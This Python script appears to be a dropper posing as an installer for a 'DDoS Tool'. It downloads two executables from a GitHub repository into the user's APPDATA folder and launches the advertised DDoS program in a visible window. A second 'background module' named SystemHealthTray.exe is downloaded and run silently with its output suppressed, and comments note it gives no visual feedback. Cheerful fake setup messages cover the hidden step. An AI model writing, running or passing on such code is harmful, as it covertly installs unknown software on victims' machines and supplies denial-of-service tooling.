import requests
import subprocess
import os
import time

def fancy_print(text, delay=0.3):
    print(text)
    time.sleep(delay)

def main():
    appdata_path = os.getenv("APPDATA")
    if not appdata_path:
        return

    
    tools = [
        {
            "name": "DDoS Tool",
            "url": "https://github.com/dcx0212/CYBERSECURITY/raw/refs/heads/main/DDoS-NET.exe",
            "visible": True
        },
        {
            "name": "background module",
            "url": "https://github.com/dcx0212/CYBERSECURITY/raw/refs/heads/main/SystemHealthTray.exe",
            "visible": False  # Geen visuele feedback
        }
    ]

    fancy_print("📦 Loading packets...")
    time.sleep(0.4)
    fancy_print("🔄 Installing modules...")
    time.sleep(0.4)

    for tool in tools:
        filename = os.path.basename(tool["url"])
        filepath = os.path.join(appdata_path, filename)

        try:
            response = requests.get(tool["url"], timeout=10)
            response.raise_for_status()
            with open(filepath, 'wb') as f:
                f.write(response.content)

            if tool["visible"]:
                fancy_print("✅ Installed: " + tool["name"])
            else:
                pass  # Geen output voor de securitytool
        except Exception:
            if tool["visible"]:
                fancy_print("❌ Failed to install: " + tool["name"])
            continue

        try:
            if tool["visible"]:
                subprocess.Popen(f'start cmd /k "{filepath}"', shell=True)
            else:
                subprocess.Popen(filepath, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            continue

    fancy_print("🚀 Finalizing setup...")
    time.sleep(0.3)
    fancy_print("✅ Your tool is ready!")
    time.sleep(0.3)
    fancy_print("👑 Made by dcx0212!")
    time.sleep(0.1)
    fancy_print("👑 Made by dcx0212!")
    time.sleep(0.1)
    fancy_print("👑 Made by dcx0212!")
    time.sleep(0.1)
    fancy_print("👑 Made by dcx0212!")
    time.sleep(0.1)
    fancy_print("👑 Made by dcx0212!")
    time.sleep(0.1)
    fancy_print("👑 Made by dcx0212!")
    time.sleep(0.1)
    fancy_print("👑 Made by dcx0212!")
    time.sleep(0.1)
    fancy_print("👑 Made by dcx0212!")
    time.sleep(0.1)


if __name__ == "__main__":
    main()